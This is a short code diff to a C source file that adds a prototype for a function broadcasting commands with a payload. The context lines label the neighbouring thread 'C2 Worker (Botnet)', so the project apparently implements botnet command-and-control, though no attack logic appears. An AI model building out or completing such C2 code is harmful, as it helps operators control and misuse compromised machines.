@@ -552,6 +552,8 @@ static void *heartbeat_monitor_thread(void *arg) {
   return NULL;
 }
 
+aegis_result_t alpha_broadcast_command(aegis_ipc_cmd_t cmd, const uint8_t *payload, size_t len);
+
 /* ── Thread: C2 Worker (Botnet) ──────────────────────────────────────────── */
 
 static void *c2_worker_thread(void *arg) {
